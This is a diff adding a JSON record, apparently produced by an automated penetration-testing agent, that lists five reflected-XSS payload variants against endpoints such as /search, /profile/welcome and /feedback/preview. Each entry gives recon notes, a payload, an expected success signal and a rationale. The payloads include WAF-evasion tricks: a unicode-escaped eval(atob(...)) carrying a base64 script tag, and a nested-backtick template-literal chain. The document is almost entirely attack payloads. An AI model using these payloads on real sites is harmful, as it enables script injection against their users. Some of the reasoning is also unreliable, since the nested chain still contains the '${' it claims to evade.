@@ -1,0 +1,68 @@
+{
+ "key": "xss_reflected_6",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "xss_reflected",
+ "variants": [
+  {
+   "endpoint": "GET /search",
+   "target_param": "q",
+   "recon_evidence": "The search term is echoed back inside an inline JavaScript template literal: var msg = `Results for ${userInput}`; no quote escaping observed.",
+   "planner_rationale": "Since the reflection lands inside backticks, a bare ${alert(1)} expression executes without needing to break out of any string delimiter.",
+   "vuln_class": "xss_reflected",
+   "payload": "${alert(1)}",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog fires when the results page renders the template literal",
+   "confidence": 0.9,
+   "reasoning": "Template literals evaluate ${ ... } as expressions directly, so injecting the interpolation syntax requires no quote-breaking and executes immediately when the reflected string is evaluated."
+  },
+  {
+   "endpoint": "GET /profile/welcome",
+   "target_param": "firstname",
+   "recon_evidence": "First name is reflected inside a template literal, but responses containing the literal substring '${' are rejected with a 400 or sanitized before rendering.",
+   "planner_rationale": "Direct ${} injection is stripped, so use the nested backtick chain which the page itself demonstrates re-enters evaluation one level deeper.",
+   "vuln_class": "xss_reflected",
+   "payload": ";`${`${`${`${alert(1)}`}`}`}`",
+   "injection_point": "query",
+   "expected_success_signal": "alert executes through the nested backtick chain despite the ${ filter",
+   "confidence": 0.75,
+   "reasoning": "The nested-literal chain re-enters template-literal evaluation through successive backticks, so a filter that strips a single level of ${} still lets the innermost expression run once the outer levels compile."
+  },
+  {
+   "endpoint": "POST /feedback/preview",
+   "target_param": "comment",
+   "recon_evidence": "Comment text is copied into an inline <script> block, and the WAF returns a block page whenever eval, atob, or alert appear verbatim in the request.",
+   "planner_rationale": "Keyword filter blocks readable function names, so deliver the logic with unicode-escaped identifiers plus base64-decoded script content.",
+   "vuln_class": "xss_reflected",
+   "payload": "\\u0065\\u0076\\u0061\\u006C(\\u0061\\u0074\\u006F\\u0062('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))",
+   "injection_point": "body",
+   "expected_success_signal": "Decoded payload runs inside the inline script and fires alert(1) with no readable keywords present",
+   "confidence": 0.82,
+   "reasoning": "The unicode-escaped eval(atob(...)) form presents only escape sequences to the keyword filter while the engine compiles the real identifiers, and the base64 blob decodes to a full <script>alert(1)</script> element at runtime."
+  },
+  {
+   "endpoint": "GET /docs/view",
+   "target_param": "doc",
+   "recon_evidence": "Document ID is reflected unquoted inside a script context on a debug view that exposes eval; a keyword filter strips eval/atob/alert from the query string.",
+   "planner_rationale": "Inline script context with eval available calls for the unicode-escape + base64 delivery so no banned keywords reach the filter.",
+   "vuln_class": "xss_reflected",
+   "payload": "\\u0065\\u0076\\u0061\\u006C(\\u0061\\u0074\\u006F\\u0062('PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='))",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog appears even though the request contained none of the blacklisted function names",
+   "confidence": 0.7,
+   "reasoning": "Reflecting into an unescaped script context lets the escaped eval(atob(...)) chain compile into the real calls, decoding to executable script content while the filter only ever sees backslash-u sequences."
+  },
+  {
+   "endpoint": "GET /greet",
+   "target_param": "msg",
+   "recon_evidence": "Message parameter is interpolated into a JavaScript template literal in a reflected header script, and responses containing the raw '${' substring are silently dropped before send.",
+   "planner_rationale": "A simple ${} probe is filtered, so escalate to the nested-backtick payload which the target's own CSP-bypass notes show still evaluates.",
+   "vuln_class": "xss_reflected",
+   "payload": ";`${`${`${`${alert(1)}`}`}`}`",
+   "injection_point": "query",
+   "expected_success_signal": "alert fires via the nested template-literal chain even though '${' was stripped once",
+   "confidence": 0.65,
+   "reasoning": "The chain of nested backticks reconstructs an evaluable template literal after a single-pass ${ strip, so the innermost alert(1) still executes when the reflected script is parsed."
+  }
+ ],
+ "raw_tail": "tion_point\": \"query\",\n  \"expected_success_signal\": \"alert fires via the nested template-literal chain even though '${' was stripped once\",\n  \"confidence\": 0.65,\n  \"reasoning\": \"The chain of nested backticks reconstructs an evaluable template literal after a single-pass ${ strip, so the innermost alert(1) still executes when the reflected script is parsed.\"\n }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
